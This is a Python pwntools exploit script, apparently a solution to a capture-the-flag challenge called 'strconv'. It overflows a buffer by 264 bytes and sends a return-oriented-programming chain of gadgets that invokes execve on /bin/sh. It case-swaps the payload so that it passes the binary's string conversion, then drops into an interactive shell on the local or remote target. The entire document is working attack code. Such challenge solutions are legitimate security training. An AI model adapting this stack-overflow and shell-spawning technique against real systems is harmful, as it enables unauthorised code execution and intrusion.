from pwn import *
from string import ascii_uppercase, ascii_lowercase

context.arch = 'x86_64'

HOST: str = "strconv.challs.cyberchallenge.it"
PORT: int = 37000
BIN: str = "./strconv"

"""
	[+] Gadget found: 0x450e67 pop rax ; ret
	[+] Gadget found: 0x40249f pop rdi ; ret
	[+] Gadget found: 0x40a58e pop rsi ; ret
	[+] Gadget found: 0x49d4eb pop rdx ; pop rbx ; ret
  [+] Gadget found: 0x402254 syscall
"""

OFFSET: int = 264
POP_RAX_ADDR: int = 0x450e67
POP_RDI_ADDR: int = 0x40249f
POP_RSI_ADDR: int = 0x40a58e
POP_RDX_RBX_ADDR: int = 0x49d4eb
SYSCALL_ADDR: int = 0x402254
BIN_SH_ADDR: int = 0x4b7204

PAYLOAD: bytes = (
  b'a' * OFFSET +
  p64(POP_RAX_ADDR) + p64(0x3b) +
  p64(POP_RDI_ADDR) + p64(BIN_SH_ADDR) +
  p64(POP_RSI_ADDR) + p64(0) +
  p64(POP_RDX_RBX_ADDR) + p64(0) + p64(0) +
  p64(SYSCALL_ADDR)
)

def switch_case(input: bytes) -> bytes:
  output = bytearray(input)
  print(output)
  diff = ord('a')-ord('A')

  for b, i in zip(output, range(len(output))):
    if b == 0: break

    if chr(b) in ascii_lowercase: output[i] -= diff
    elif chr(b) in ascii_uppercase: output[i] += diff
  
  return bytes(output)

def get_target():
  if args.REMOTE:
    return connect(HOST, PORT)
  else:
    return process(BIN)

def main():
  app = get_target()
  app.sendlineafter(b'> ', b'3')
  app.sendlineafter(b'Input : ', switch_case(PAYLOAD))
  app.sendlineafter(b'> ', b'0')
  app.interactive()

if __name__ == "__main__": main()